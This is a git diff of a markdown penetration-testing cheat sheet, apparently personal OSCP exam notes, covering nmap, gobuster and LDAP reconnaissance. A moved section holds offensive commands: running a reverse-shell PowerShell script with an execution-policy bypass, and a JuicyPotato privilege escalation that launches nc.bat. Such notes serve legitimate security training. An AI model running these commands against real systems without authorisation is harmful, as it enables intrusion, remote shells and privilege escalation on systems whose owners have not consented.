@@ -1,23 +1,14 @@
 # Recon
 
+Network - Nmap
 ```
 $ nmap -v -sSV -p [port1, port2] -Pn [host] -oN [filename]   # verbose, syn-stealth, svc versions, target ports, no-ping,
 $ nmap -v -sUV -p [port1, port2] -Pn [host] -oN [filename]   # UDP
 ```
 
-
-## Initial Exploitation
-
-### Shells
-
-Have a web shell? Check if server can reach you:
+Web - Gobuster
 ```
-$ sudo tcpdump -i tun0 -n icmp -v
-```
-
-Execute PowerShell script non-interactively:
-```
-$ powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
+$ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
 ```
 
 
@@ -43,6 +34,21 @@ https://book.hacktricks.xyz/pentesting/pentesting-ldap
 Enumerate LDAP.
 ```
 $ nmap -n -sV --script "ldap* and not brute" [target]
+```
+
+
+## Initial Exploitation
+
+### Shells
+
+Have a web shell? Check if server can reach you:
+```
+$ sudo tcpdump -i tun0 -n icmp -v
+```
+
+Execute PowerShell script non-interactively:
+```
+$ powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
 ```
 
 
@@ -74,6 +80,7 @@ JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled.
 > whoami /privs
 > JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 ```
+
 
 
 
